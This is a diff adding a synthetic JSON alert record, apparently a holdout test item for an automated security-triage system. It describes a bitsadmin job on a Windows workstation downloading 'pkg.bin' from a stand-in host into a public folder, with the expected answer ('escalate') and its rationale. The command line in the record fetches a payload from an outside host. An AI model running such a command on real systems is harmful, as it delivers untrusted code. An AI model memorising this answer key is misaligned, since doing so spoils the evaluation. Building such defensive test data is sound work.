@@ -1,0 +1,32 @@
+{
+  "alert_id": "HO2-04-bits-transfer",
+  "source": "edr",
+  "rule_name": "BITS job created with a remote source",
+  "detected_at": "2026-09-06T04:18:00+00:00",
+  "severity": "medium",
+  "category": "endpoint",
+  "device": {
+    "hostname": "WKSTN-412",
+    "ip": "10.40.30.12",
+    "os": "Windows 11"
+  },
+  "principal": {
+    "username": "a.whitfield",
+    "domain": "CORP"
+  },
+  "process": {
+    "name": "bitsadmin.exe",
+    "path": "C:\\Windows\\System32\\bitsadmin.exe",
+    "command_line": "bitsadmin /transfer wu /download /priority high http://updates-cdn.hosting-a4.example/pkg.bin C:\\Users\\Public\\pkg.bin"
+  },
+  "labels": {
+    "verdict": "escalate",
+    "techniques": [
+      "T1197"
+    ],
+    "should_escalate": true,
+    "why": "A BITS job pulling an executable from an unfamiliar host, which survives reboots and runs outside the calling process. Bishop has no BITS detector and no connection records here, so there is very little it can measure. Escalating on thin evidence is the correct answer; closing it is not.",
+    "synthetic": true,
+    "holdout": true
+  }
+}
